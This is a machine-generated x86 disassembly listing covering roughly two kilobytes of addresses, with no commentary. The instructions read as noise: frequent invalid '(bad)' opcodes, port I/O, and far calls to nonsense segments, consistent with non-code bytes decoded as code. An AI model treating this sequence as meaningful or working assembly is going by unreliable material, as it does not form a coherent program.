  4253ff:	xchg   ebp,eax
  425400:	mov    al,ds:0xedd421ac
  425405:	mov    dh,0xfc
  425407:	mov    ecx,0xa083621b
  42540c:	adc    BYTE PTR [ebx+0x34217739],bl
  425412:	mov    WORD PTR [ebx+0x3d4c4b1],?
  425418:	mov    cl,0xc
  42541a:	lods   al,BYTE PTR ds:[esi]
  42541b:	outs   dx,DWORD PTR ds:[esi]
  42541c:	js     0x42547b
  42541e:	iret   
  42541f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425420:	(bad)  
  425421:	xchg   ebx,eax
  425422:	cmp    ah,BYTE PTR [esi-0x31]
  425425:	nop
  425426:	xchg   BYTE PTR [edx+0x749ad802],dl
  42542c:	outs   dx,DWORD PTR ds:[esi]
  42542d:	leave  
  42542e:	aas    
  42542f:	loope  0x4253d6
  425431:	dec    edx
  425432:	sub    DWORD PTR [ecx+0x6e56776a],edi
  425438:	mov    BYTE PTR [eax-0x6f],ah
  42543b:	push   eax
  42543c:	jb     0x4253de
  42543e:	(bad)  
  42543f:	push   ds
  425440:	mov    dl,0x9
  425442:	aas    
  425443:	enter  0xeb10,0x89
  425447:	inc    ecx
  425448:	ror    DWORD PTR [ebx],cl
  42544a:	icebp  
  42544b:	in     al,0x93
  42544d:	pushf  
  42544e:	idiv   BYTE PTR [eax-0x676711b3]
  425454:	out    dx,al
  425455:	jmp    0x3fde:0x68a306d4
  42545c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42545d:	cmp    DWORD PTR [ebx+0x1dcc32a7],ebx
  425463:	(bad)  
  425465:	cmc    
  425466:	call   0xf2910662
  42546b:	not    BYTE PTR [edx+0x1d]
  42546e:	mov    esp,0x6e951b16
  425473:	xor    al,0x73
  425475:	or     cl,dl
  425477:	rol    BYTE PTR [esi+0x42090570],cl
  42547d:	aam    0xb9
  42547f:	inc    ecx
  425480:	mov    dl,0x4a
  425482:	cmp    WORD PTR [ebx-0x20],0xecb3
  425488:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425489:	adc    DWORD PTR ss:[ebx+0x32],esp
  42548d:	fbld   TBYTE PTR [edx+0x7]
  425490:	mov    WORD PTR [eax],gs
  425492:	sahf   
  425493:	mov    bl,0xb1
  425495:	lock cld 
  425497:	lahf   
  425498:	sub    edx,0x22
  42549b:	ja     0x42544d
  42549d:	push   0x38
  42549f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4254a0:	out    0x7c,eax
  4254a2:	xor    eax,0xb464112
  4254a7:	push   ds
  4254a8:	mov    bl,0x7d
  4254aa:	pop    edi
  4254ab:	nop
  4254ac:	fwait
  4254ad:	adc    eax,0xd5920d0d
  4254b2:	xor    DWORD PTR [ebp+0x48],ecx
  4254b5:	or     ebx,DWORD PTR [ebp-0x35]
  4254b8:	and    eax,DWORD PTR [eax+ebx*2-0x600d095d]
  4254bf:	ret    
  4254c0:	add    BYTE PTR [ecx-0x43],dh
  4254c3:	sbb    BYTE PTR [edx],dh
  4254c5:	dec    BYTE PTR [ebp+edx*8+0x58]
  4254c9:	jns    0x425471
  4254cb:	mov    ds:0x14df043c,al
  4254d0:	iret   
  4254d1:	mov    eax,DWORD PTR [ebx]
  4254d3:	ret    0x7112
  4254d6:	mov    ds:0x3b8b638a,eax
  4254db:	xchg   ecx,eax
  4254dc:	fidiv  DWORD PTR [edi+0xa10352d]
  4254e2:	xor    eax,0x9ca33c78
  4254e7:	xchg   DWORD PTR [eax-0x4d98281d],esi
  4254ed:	in     eax,dx
  4254ee:	jbe    0x4254e5
  4254f0:	push   ss
  4254f1:	bound  esp,QWORD PTR [edx+0x1e0b103a]
  4254f7:	aaa    
  4254f8:	mov    esi,0xc6e7d95d
  4254fd:	loope  0x425499
  4254ff:	jbe    0x425484
  425501:	push   edi
  425502:	outs   dx,DWORD PTR ds:[esi]
  425503:	in     eax,0x9b
  425505:	cmovle esp,DWORD PTR [edi+0x105f2b2b]
  42550c:	adc    eax,0xb028022f
  425511:	lock add DWORD PTR ds:0xe71f68d2,edi
  425518:	call   0x637:0x76a76e16
  42551f:	jo     0x425528
  425521:	rcl    BYTE PTR ds:0xe58faede,0x59
  425528:	dec    ecx
  425529:	or     esp,DWORD PTR [edx+ecx*8+0xec68092]
  425530:	pop    ebx
  425531:	adc    esi,DWORD PTR [esi-0x24]
  425534:	cmp    BYTE PTR [ecx-0x564d9100],bl
  42553a:	pop    esi
  42553b:	shr    BYTE PTR [ebx-0x211b2e39],cl
  425541:	or     esp,eax
  425543:	xchg   ebp,eax
  425544:	mov    edx,0xced97231
  425549:	push   ecx
  42554a:	fwait
  42554b:	out    0x5,al
  42554d:	ror    dh,1
  42554f:	dec    esi
  425550:	push   edx
  425551:	adc    eax,0xbb41962
  425556:	mov    edi,0x1042517b
  42555b:	jno    0x425516
  42555d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42555e:	mov    al,ds:0x9ba7a356
  425563:	sub    BYTE PTR [ebx+ecx*4+0x1f22d263],cl
  42556a:	clc    
  42556b:	aad    0xe1
  42556d:	add    BYTE PTR [ebp+0x1a425b9b],al
  425573:	push   esi
  425574:	or     BYTE PTR [esi+0x64],0x91
  425578:	mov    dl,0xb8
  42557a:	pop    ds
  42557b:	dec    esp
  42557c:	push   eax
  42557d:	add    eax,DWORD PTR [esi+0x51]
  425580:	daa    
  425581:	or     ecx,eax
  425583:	sar    BYTE PTR [ebx+eax*2-0x6a],0xa0
  425588:	loop   0x4255e1
  42558a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42558b:	loope  0x4255a6
  42558d:	or     esp,DWORD PTR [edi]
  42558f:	sbb    eax,0xd83b0664
  425594:	add    al,0xf3
  425596:	cdq    
  425597:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425598:	pop    ss
  425599:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42559a:	std    
  42559b:	aad    0x37
  42559d:	retf   
  42559e:	outs   dx,BYTE PTR ds:[esi]
  42559f:	out    0xb2,al
  4255a1:	(bad)  
  4255a2:	cli    
  4255a3:	fiadd  WORD PTR [ebx]
  4255a5:	dec    ecx
  4255a6:	mov    al,0x46
  4255a8:	lods   al,BYTE PTR ds:[esi]
  4255a9:	or     edx,DWORD PTR [ebp+eax*1-0x38]
  4255ad:	mov    BYTE PTR [ecx+0x51],al
  4255b0:	popf   
  4255b1:	inc    esi
  4255b2:	call   0x19b2:0x703c28a3
  4255b9:	mov    dh,0x7b
  4255bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4255bc:	and    DWORD PTR [eax],edi
  4255be:	or     edi,DWORD PTR [edi-0x19d2d364]
  4255c4:	mov    dl,0x70
  4255c6:	call   0xc5adb4a
  4255cb:	ret    
  4255cc:	pop    esp
  4255cd:	or     ecx,DWORD PTR [esi+0x7c599f3d]
  4255d3:	mov    eax,0x829a7323
  4255d8:	loop   0x42555d
  4255da:	loope  0x425596
  4255dc:	ins    BYTE PTR es:[edi],dx
  4255dd:	xor    DWORD PTR [ebx-0x5c],ebp
  4255e0:	xor    DWORD PTR [ecx+0x53],edx
  4255e3:	(bad)  [eax-0x1aaa95cb]
  4255e9:	jge    0x425585
  4255eb:	cld    
  4255ec:	aaa    
  4255ed:	(bad)  
  4255ee:	pop    ss
  4255ef:	xor    edi,0xffffffc9
  4255f2:	inc    ecx
  4255f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4255f4:	mov    esp,0x505bbcf4
  4255f9:	fsub   DWORD PTR [esi]
  4255fb:	enter  0x6ee2,0x22
  4255ff:	push   ecx
  425600:	mov    dl,0x2
  425602:	xor    BYTE PTR [ecx-0x2c],0x98
  425606:	add    ebp,edi
  425608:	test   BYTE PTR [ebx],0x6d
  42560b:	icebp  
  42560c:	call   0xe9c2939
  425611:	dec    esp
  425612:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425613:	rcr    BYTE PTR [ebx+0xb],1
  425616:	test   edi,0xd3812940
  42561c:	ret    
  42561d:	or     edx,DWORD PTR [ecx-0x7]
  425620:	sar    BYTE PTR [edx+0x58cc5b00],0x7e
  425627:	xor    DWORD PTR [edx+0x21e73261],0xffffffb5
  42562e:	pop    ebp
  42562f:	rol    edi,0x36
  425632:	or     al,0x5
  425634:	mov    bl,0xfb
  425636:	mov    al,0xdf
  425638:	sbb    BYTE PTR [eax+0x6b1f628e],dl
  42563e:	mov    al,dh
  425640:	mov    cl,0xbd
  425642:	cmp    al,0xa4
  425644:	nop
  425645:	sub    BYTE PTR [esi],ah
  425647:	inc    edi
  425648:	pop    edx
  425649:	into   
  42564a:	inc    DWORD PTR [eax-0x711bd3c2]
  425650:	mov    dl,0x63
  425652:	dec    eax
  425653:	adc    bh,BYTE PTR [edi+0x66]
  425656:	dec    edx
  425657:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425658:	scas   al,BYTE PTR es:[edi]
  425659:	push   es
  42565a:	daa    
  42565b:	adc    BYTE PTR [ebp+0x1b],dl
  42565e:	cmp    esi,edi
  425660:	sar    bh,0x9a
  425663:	stc    
  425664:	hlt    
  425665:	xlat   BYTE PTR ds:[ebx]
  425666:	add    eax,0xfccac68e
  42566b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42566c:	adc    al,0x36
  42566e:	dec    ebp
  42566f:	sahf   
  425670:	pushf  
  425671:	mov    eax,ds:0x9b51de3
  425676:	dec    edi
  425677:	xor    BYTE PTR [edx-0x1],dl
  42567a:	sbb    eax,0xb1efc12c
  42567f:	ja     0x4256cd
  425681:	je     0x42567d
  425683:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425684:	fbstp  TBYTE PTR [ebx+0x29]
  425687:	repnz sub al,0x61
  42568a:	cmp    al,0xc6
  42568c:	pop    esp
  42568d:	iret   
  42568e:	call   0x1a3b:0x2c56203
  425695:	mov    edx,0x10d0a72f
  42569a:	dec    ebp
  42569b:	sub    dh,BYTE PTR [ebp+0x71]
  42569e:	in     al,0x49
  4256a0:	jmp    0x4f13:0xeda70321
  4256a7:	lods   eax,DWORD PTR ds:[esi]
  4256a8:	cmp    al,0x6b
  4256aa:	dec    edx
  4256ab:	fld    QWORD PTR [eax-0x607e45f5]
  4256b1:	mov    ds:0xd2451ded,eax
  4256b6:	pusha  
  4256b7:	stos   BYTE PTR es:[edi],al
  4256b8:	mov    dl,0x3d
  4256ba:	(bad)  
  4256bb:	imul   ebp,DWORD PTR [ecx+0x641b3ced],0x7a
  4256c2:	shl    DWORD PTR [edi+0x557287bd],1
  4256c8:	sub    ebx,DWORD PTR [edx]
  4256ca:	lds    esp,FWORD PTR [edx+esi*4-0x7cd3e140]
  4256d1:	mov    ebx,0xbac8ae6
  4256d6:	cs in  al,0x5c
  4256d9:	mov    DWORD PTR [esi-0x65171ac1],ecx
  4256df:	dec    ebx
  4256e0:	push   esp
  4256e1:	xor    BYTE PTR [ecx],bh
  4256e3:	xchg   edi,eax
  4256e4:	and    al,0x6b
  4256e6:	fwait
  4256e7:	mov    edx,0xa61ed458
  4256ec:	test   DWORD PTR [ebx-0xc87bc43],edx
  4256f2:	ret    0xbcd8
  4256f5:	mov    bl,0xdc
  4256f7:	les    ecx,FWORD PTR [eax]
  4256f9:	inc    ebp
  4256fa:	mov    esi,0x5db27047
  4256ff:	mov    DWORD PTR [esi],0xb41f26eb
  425705:	or     esi,DWORD PTR [ebx-0x32bddbc9]
  42570b:	cdq    
  42570c:	call   0xc389f150
  425711:	ret    
  425712:	mov    WORD PTR [edi],cs
  425714:	mov    BYTE PTR [ebp+0x9ba7dc],ch
  42571a:	inc    ebp
  42571b:	arpl   WORD PTR [ecx-0x4d0c83e2],sp
  425721:	sub    ch,BYTE PTR [esi]
  425723:	and    al,0x46
  425725:	dec    eax
  425726:	add    BYTE PTR [eax+0xe],bl
  425729:	or     esp,esi
  42572b:	cmp    DWORD PTR [edx],0x5a6c1b6a
  425731:	ret    0x759a
  425734:	in     al,0xb6
  425736:	lods   eax,DWORD PTR ds:[esi]
  425738:	data16 in al,0x3f
  42573b:	mov    eax,0x277f8670
  425740:	ja     0x4256e0
  425742:	or     ch,al
  425744:	add    cl,BYTE PTR [esi-0x63]
  425747:	sbb    al,0xe9
  425749:	and    ecx,DWORD PTR [eax+0x34aa32a5]
  42574f:	mov    BYTE PTR [edi],cl
  425751:	or     edi,DWORD PTR [ebx+0x236803bd]
  425757:	cmp    DWORD PTR [edx-0x4c],ebx
  42575a:	call   0xcc19:0x62d3d03a
  425761:	arpl   WORD PTR [edi+eiz*4],si
  425764:	jg     0x42577d
  425766:	in     eax,0xad
  425768:	(bad)  
  425769:	mov    ds:0x18b2ba13,al
  42576e:	outs   dx,DWORD PTR ds:[esi]
  42576f:	shl    DWORD PTR [edx+0x13],cl
  425772:	inc    eax
  425773:	das    
  425774:	clc    
  425775:	or     esi,DWORD PTR [eax]
  425777:	mov    esp,0x8d8466e7
  42577c:	cli    
  42577d:	in     eax,dx
  42577e:	call   0xeda8:0x5853d142
  425785:	dec    eax
  425786:	xchg   esi,eax
  425787:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425788:	push   ebp
  425789:	scas   al,BYTE PTR es:[edi]
  42578a:	jae    0x42577c
  42578c:	dec    ebp
  42578d:	aas    
  42578e:	add    DWORD PTR [esi],ebp
  425790:	mov    dl,0x9
  425792:	xor    DWORD PTR [edi],ebx
  425794:	xor    eax,0x3df8ecf5
  425799:	or     esp,DWORD PTR [ecx]
  42579b:	test   eax,0xfefcc667
  4257a0:	data16 icebp 
  4257a2:	call   0x9ef4:0x91ed0012
  4257a9:	adc    esi,DWORD PTR [ebp-0x5c]
  4257ac:	popa   
  4257ad:	and    bh,BYTE PTR [eax+0x2d1a0d7]
  4257b3:	(bad)  
  4257b4:	pop    edi
  4257b5:	sub    ch,al
  4257b7:	in     eax,0xb2
  4257b9:	mov    esp,ebp
  4257bb:	lahf   
  4257bc:	bound  esi,QWORD PTR [edi+0x61]
  4257bf:	or     ah,cl
  4257c1:	or     eax,DWORD PTR [esi+esi*4]
  4257c4:	das    
  4257c5:	mov    bl,0xda
  4257c7:	dec    BYTE PTR [eax+0x5f]
  4257ca:	call   0x9e14:0xdc9b7ab
  4257d1:	ja     0x4257b6
  4257d3:	mov    eax,0x2711d093
  4257d8:	adc    al,0x4c
  4257da:	sbb    al,0x69
  4257dc:	or     esp,eax
  4257de:	call   0xd030:0xde3b70ba
  4257e5:	(bad)  
  4257e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4257e8:	lods   eax,DWORD PTR ds:[esi]
  4257e9:	(bad)  
  4257ea:	pop    edi
  4257eb:	call   0x3ac9168b
  4257f0:	mov    dl,0x6a
  4257f2:	sbb    BYTE PTR ds:0x382c9bc5,bh
  4257f8:	jmp    0x4f764208
  4257fd:	loope  0x425793
  4257ff:	dec    esi
  425800:	test   BYTE PTR [edi-0x1631f867],cl
  425806:	mov    ebp,0xa5e30497
  42580b:	add    cl,BYTE PTR [ecx-0x24d72f00]
  425811:	lods   al,BYTE PTR ds:[esi]
  425812:	call   0xea68:0x91b03c84
  425819:	mov    cl,0x8c
  42581b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42581c:	fsubr  st,st(1)
  42581e:	aad    0x38
  425820:	fld    DWORD PTR [ecx]
  425822:	stos   BYTE PTR es:[edi],al
  425823:	test   al,0x4b
  425825:	xor    cl,BYTE PTR [esi+eiz*8]
  425828:	jb     0x425870
  42582a:	mov    eax,0x9c6b660a
  42582f:	jns    0x425874
  425831:	push   edx
  425832:	scas   eax,DWORD PTR es:[edi]
  425833:	lods   eax,DWORD PTR ds:[esi]
  425834:	dec    esp
  425835:	or     ecx,edi
  425837:	in     eax,0x62
  425839:	lods   al,BYTE PTR ds:[esi]
  42583a:	sub    cl,BYTE PTR [edi+0x6e8d201]
  425840:	mov    dl,0x69
  425842:	mov    bl,0x66
  425844:	push   ecx
  425845:	repnz scas al,BYTE PTR es:[edi]
  425847:	xchg   ebp,eax
  425848:	push   cs
  425849:	or     edi,DWORD PTR [ebp+edx*2+0x2c]
  42584d:	or     al,0xc0
  42584f:	mov    DWORD PTR [ebx-0x5c],ebx
  425852:	call   0xffb9:0xaa420fde
  425859:	adc    DWORD PTR [eax],edx
  42585b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42585c:	test   DWORD PTR [edx+0x4c],edx
  42585f:	mov    esi,0x4bcc391e
  425864:	pushf  
  425865:	mov    dh,0x9a
  425867:	mov    eax,0x49db2941
  42586c:	mov    edx,0xba7868c
  425871:	add    al,0x26
  425873:	in     al,dx
  425874:	push   esi
  425875:	outs   dx,DWORD PTR ds:[esi]
  425876:	xchg   ecx,eax
  425877:	lock mov dl,0xf3
  42587a:	rcr    BYTE PTR [ecx],cl
  42587c:	fimul  WORD PTR ds:0xbf03557
  425882:	mov    ebp,0x123db4
  425887:	inc    edx
  425888:	test   BYTE PTR [edi-0x77b25c66],0x1f
  42588f:	pop    edx
  425890:	ins    DWORD PTR es:[edi],dx
  425891:	and    eax,ebx
  425893:	mov    ds:0x81d9ae4c,eax
  425898:	push   eax
  425899:	retf   
  42589a:	out    dx,eax
  42589b:	enter  0x97d6,0xbc
  42589f:	stos   DWORD PTR es:[edi],eax
  4258a0:	adc    DWORD PTR [ecx-0x62],esp
  4258a3:	fist   DWORD PTR [edx-0x12]
  4258a6:	sbb    eax,0x5ba36737
  4258ab:	hlt    
  4258ac:	push   ds
  4258ad:	sahf   
  4258ae:	jbe    0x425912
  4258b0:	sahf   
  4258b1:	or     esp,DWORD PTR [edx+0x67935eca]
  4258b7:	inc    edi
  4258b8:	repnz add eax,0x74a4b796
  4258be:	std    
  4258bf:	addr16 (bad) 
  4258c1:	or     esp,DWORD PTR ds:0xdc82b49d
  4258c7:	inc    ebx
  4258c8:	cmp    eax,0xf1489a8a
  4258cd:	outs   dx,DWORD PTR ds:[esi]
  4258ce:	daa    
  4258cf:	in     eax,0x8d
  4258d1:	jno    0x4258a9
  4258d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4258d4:	shr    eax,0x1f
  4258d7:	pop    ds
  4258d8:	mov    cl,0x22
  4258da:	mov    al,ds:0xa8c78ebb
  4258df:	sbb    al,0x1e
  4258e1:	add    al,0xc9
  4258e3:	mov    ds:0x88ce2b44,eax
  4258e8:	scas   eax,DWORD PTR es:[edi]
  4258e9:	(bad)  
  4258ea:	(bad)  
  4258eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4258ec:	aad    0xaa
  4258ee:	aaa    
  4258ef:	inc    esi
  4258f0:	jp     0x42595f
  4258f2:	sbb    edi,DWORD PTR [eax+0x5f14b596]
  4258f8:	mov    dl,0xe0
  4258fa:	push   eax
  4258fb:	test   DWORD PTR ss:[esi+0x12d59af7],esi
  425902:	call   0xa1f1:0x49d29e66
  425909:	loope  0x4258b0
  42590b:	leave  
  42590c:	test   eax,0xcf51080b
  425911:	cwde   
  425912:	and    ebp,DWORD PTR [ebp-0x77]
  425915:	or     ebp,DWORD PTR [ebx]
  425917:	out    0x1b,al
  425919:	adc    DWORD PTR [ebp-0x65e7f91d],esp
  42591f:	lods   eax,DWORD PTR ds:[esi]
  425920:	mov    cl,0xac
  425922:	lahf   
  425923:	jnp    0x42594a
  425925:	sub    BYTE PTR [esi-0x59],bl
  425928:	push   edx
  425929:	(bad)  
  42592a:	stos   DWORD PTR es:[edi],eax
  42592b:	sub    ebp,DWORD PTR ds:0xb41a72d9
  425931:	cld    
  425932:	mov    eax,ds:0x12e8a9be
  425937:	test   eax,0xc1809884
  42593c:	mov    dl,0xa4
  42593e:	xchg   ebp,eax
  42593f:	jmp    0x42592e
  425941:	and    BYTE PTR [eax+esi*1+0x3d848b26],0xee
  425949:	mov    edx,0xae6a31b
  42594e:	cmp    al,0x22
  425950:	jp     0x425963
  425952:	iret   
  425953:	jno    0x425973
  425955:	dec    ebx
  425956:	xor    edx,DWORD PTR [edi+ebx*2-0x16]
  42595a:	xchg   esp,eax
  42595b:	mov    ah,0xc2
  42595d:	fcmovnu st,st(2)
  42595f:	push   0x4fcb0c73
  425964:	adc    dh,BYTE PTR [edi+0xb752811]
  42596a:	cs (bad) 
  42596c:	and    DWORD PTR [edi+0x12],esp
  42596f:	rcl    DWORD PTR [ebp-0x60],cl
  425972:	call   0x84d4:0x69d67384
  425979:	inc    eax
  42597a:	imul   ebp,DWORD PTR [ecx+0x261f8500],0x52
  425981:	jnp    0x4259fe
  425983:	lahf   
  425984:	adc    eax,DWORD PTR ds:0x5da5726c
  42598a:	dec    esp
  42598b:	sahf   
  42598c:	mov    dl,0x91
  42598e:	mov    esi,0xb2d0f0bb
  425993:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425994:	jno    0x4259ce
  425996:	lahf   
  425997:	popf   
  425998:	push   ss
  425999:	pop    ecx
  42599a:	mov    dh,BYTE PTR [ebx+0x559d8ac4]
  4259a0:	pop    edx
  4259a1:	xchg   edx,eax
  4259a2:	jl     0x42594a
  4259a4:	mov    dl,0x6e
  4259a6:	fisttp DWORD PTR fs:[edi]
  4259a9:	mov    bl,0xac
  4259ab:	test   eax,0xb5472b07
  4259b0:	repnz out 0x79,eax
  4259b3:	fimul  DWORD PTR [ecx-0x5a9c6554]
  4259b9:	ins    DWORD PTR es:[edi],dx
  4259ba:	(bad)  
  4259bb:	(bad)  
  4259bc:	clc    
  4259bd:	push   edx
  4259be:	jae    0x425975
  4259c0:	push   ebx
  4259c1:	add    al,cl
  4259c3:	mov    al,ds:0x1342fc8e
  4259c8:	lock retf 
  4259ca:	ins    BYTE PTR es:[edi],dx
  4259cb:	ret    0x8fb7
  4259ce:	mov    esi,0x8e045e92
  4259d3:	inc    ebx
  4259d4:	push   0xb
  4259d6:	mov    cx,?
  4259d9:	scas   eax,DWORD PTR es:[edi]
  4259da:	sub    eax,DWORD PTR [edx]
  4259dc:	loope  0x4259dd
  4259de:	mov    bh,0xa0
  4259e0:	add    eax,0x6731744e
  4259e5:	mov    ebx,0x2d0acdfd
  4259ea:	jl     0x425a61
  4259ec:	mov    edx,DWORD PTR [edi]
  4259ee:	bound  edi,QWORD PTR [eax+0x3f9a3807]
  4259f4:	mov    edi,0xb51dbe26
  4259f9:	or     eax,DWORD PTR [ebx]
  4259fb:	adc    edx,ebp
  4259fd:	je     0x4259a2
  4259ff:	cmp    al,0x3a
  425a01:	jmp    0x71575ea0
  425a06:	inc    DWORD PTR [eax+0x2f]
  425a09:	and    edx,DWORD PTR [edi+0x19dca49c]
  425a0f:	mov    ebx,0xbd651e8e
  425a14:	push   0x44
  425a16:	bound  ebp,QWORD PTR [edx+esi*4-0x46]
  425a1a:	frstor ds:0x32f4544b
  425a20:	je     0x425a21
  425a22:	leave  
  425a23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425a24:	cmp    eax,0x6e87ce66
  425a29:	xor    ebx,0x3a
  425a2c:	mov    dl,0xf5
  425a2e:	jp     0x425a34
  425a30:	push   ecx
  425a31:	jmp    FWORD PTR [eax]
  425a33:	out    dx,eax
  425a34:	ror    DWORD PTR [ebx],cl
  425a36:	lods   eax,DWORD PTR ds:[esi]
  425a37:	ret    0xf3a9
  425a3a:	mov    esp,0x9ad9a7a2
  425a3f:	out    0x27,al
  425a41:	cld    
  425a42:	mov    ah,0x1f
  425a44:	ins    BYTE PTR es:[edi],dx
  425a45:	inc    esp
  425a46:	sti    
  425a47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425a48:	cmp    esp,DWORD PTR [ebp-0x73964a08]
  425a4e:	dec    esi
  425a4f:	sti    
  425a50:	pushf  
  425a51:	jmp    0xc43c:0x55b2b674
  425a58:	pusha  
  425a59:	lahf   
  425a5a:	fwait
  425a5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425a5c:	mov    ecx,0xa57171be
  425a61:	test   BYTE PTR ds:0x469db23f,ch
  425a67:	cmp    edi,DWORD PTR [eax+0x7c9aba49]
  425a6d:	or     edx,ebx
  425a6f:	fdivr  DWORD PTR [ebp+0x4]
  425a72:	popa   
  425a73:	ja     0x425a77
  425a75:	sbb    BYTE PTR [ebp+0x5a26de8e],0x43
  425a7c:	loop   0x425a77
  425a7e:	mov    ebp,edi
  425a80:	inc    ebp
  425a81:	or     ecx,DWORD PTR [edx+0x10a1a318]
  425a87:	mov    dl,0xf5
  425a89:	cmp    ebx,DWORD PTR [edx-0x473cd1b7]
  425a8f:	inc    edi
  425a90:	inc    edx
  425a91:	into   
  425a92:	push   ecx
  425a93:	fwait
  425a94:	call   0xc65a:0xc1919a83
  425a9b:	retf   
  425a9c:	pop    edx
  425a9d:	jb     0x425a3c
  425a9f:	leave  
  425aa0:	push   0x1
  425aa2:	ins    DWORD PTR es:[edi],dx
  425aa3:	sbb    DWORD PTR [eax+0x6],esp
  425aa6:	dec    ebp
  425aa7:	addr16 inc ebp
  425aa9:	cmp    BYTE PTR ds:0xe65bbdeb,bl
  425aaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425ab0:	mov    ebp,DWORD PTR [eax-0x1f08a26f]
  425ab6:	xlat   BYTE PTR ds:[ebx]
  425ab7:	loopne 0x425aea
  425ab9:	sub    ecx,DWORD PTR [edi-0x4b6d3729]
  425abf:	and    al,0x10
  425ac1:	jne    0x425a5d
  425ac3:	xchg   edx,eax
  425ac4:	dec    edi
  425ac5:	push   edx
  425ac6:	jl     0x425a9e
  425ac8:	into   
  425ac9:	or     ebp,DWORD PTR [ecx+eax*8]
  425acc:	dec    ecx
  425acd:	add    esp,0x9dd1911f
  425ad3:	out    dx,al
  425ad4:	ins    DWORD PTR es:[edi],dx
  425ad5:	rcl    BYTE PTR [edi+ebp*2+0x5c],cl
  425ad9:	retf   
  425ada:	in     al,0x5
  425adc:	aas    
  425add:	or     eax,0xfbf3bbef
  425ae2:	cmp    edx,0x66e30ba1
  425ae8:	mov    gs,WORD PTR [ecx-0x19]
  425aeb:	xchg   esi,eax
  425aec:	mov    dl,0xd6
  425aee:	push   ds
  425aef:	jle    0x425b62
  425af1:	cmc    
  425af2:	xlat   BYTE PTR ds:[ebx]
  425af3:	pop    ss
  425af4:	mov    ds:0xca10b10b,al
  425af9:	cmp    DWORD PTR [edi-0x65de86f1],edi
  425aff:	loopne 0x425a93
  425b01:	push   0xf02a0ad5
  425b06:	mov    al,ds:0x679710a7
  425b0b:	cmp    BYTE PTR [edi-0x6b],ah
  425b0e:	lahf   
  425b0f:	mov    ebx,0xf0e2a1b2
  425b14:	scas   eax,DWORD PTR es:[edi]
  425b15:	sar    DWORD PTR [edx+0x1b],0x91
  425b19:	ja     0x425a9c
  425b1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425b1c:	and    BYTE PTR [eax+0x18f54f7f],bh
  425b22:	dec    ebp
  425b23:	outs   dx,DWORD PTR ds:[esi]
  425b24:	mov    cl,0x6a
  425b26:	push   ss
  425b27:	mov    ecx,0x370a9c77
  425b2c:	cmp    dl,BYTE PTR [ecx+0x79]
  425b2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425b30:	jbe    0x425b58
  425b32:	int3   
  425b33:	sub    eax,0x755d467
  425b38:	xchg   esi,eax
  425b39:	enter  0xba67,0x8d
  425b3d:	neg    BYTE PTR [edx-0x32aed7cc]
  425b43:	loop   0x425ba6
  425b45:	call   0xedba025f
  425b4a:	lea    edx,[ebp-0x158f0568]
  425b50:	dec    esi
  425b51:	mov    edi,0xbdd3cb8e
  425b56:	add    al,0xa7
  425b58:	repnz pusha 
  425b5a:	pop    es
  425b5b:	out    0xb6,al
  425b5d:	inc    ebx
  425b5e:	mov    cl,0x9c
  425b60:	dec    esp
  425b61:	call   FWORD PTR [edx]
  425b63:	xor    eax,0x149f3e9e
  425b68:	jae    0x425b2f
  425b6a:	call   0x3def:0x58c430b3
  425b71:	lods   al,BYTE PTR ds:[esi]
  425b72:	cwde   
  425b73:	mov    al,ds:0x584c7d5b
  425b78:	or     esi,DWORD PTR [edx+edi*4]
  425b7b:	call   0xca745b22
  425b80:	mov    dl,0x14
  425b82:	sbb    al,0x96
  425b84:	xchg   ebp,eax
  425b85:	mov    ecx,0x6b6c5b63
  425b8a:	in     al,0xdf
  425b8c:	mov    esp,0x54913e0a
  425b91:	retf   0x4476
  425b94:	push   eax
  425b95:	test   al,0x9a
  425b97:	(bad)  
  425b98:	aad    0x4a
  425b9a:	xor    eax,0x9d457a8a
  425b9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425ba0:	pop    ebp
  425ba1:	std    
  425ba2:	call   DWORD PTR [edi]
  425ba4:	and    al,0xd4
  425ba6:	sbb    al,BYTE PTR [esi+0x20]
  425ba9:	jle    0x425b81
  425bab:	jns    0x425b5f
  425bad:	(bad)  
  425bae:	xchg   edi,eax
  425baf:	push   ss
  425bb0:	pushf  
  425bb1:	push   esi
  425bb2:	je     0x425bcf
  425bb4:	fimul  DWORD PTR [ebx]
  425bb6:	popf   
  425bb7:	outs   dx,DWORD PTR ds:[esi]
  425bb8:	(bad)  
  425bb9:	jnp    0x425b7b
  425bbb:	jne    0x425b5c
  425bbd:	push   edi
  425bbe:	xchg   esp,eax
  425bbf:	pop    edx
  425bc0:	sbb    al,0xa9
  425bc2:	int    0x67
  425bc4:	shl    DWORD PTR [ebx+0xb897b7d],0x61
  425bcb:	shl    bl,1
  425bcd:	ficom  DWORD PTR [esi]
  425bcf:	imul   esi,edx,0xd
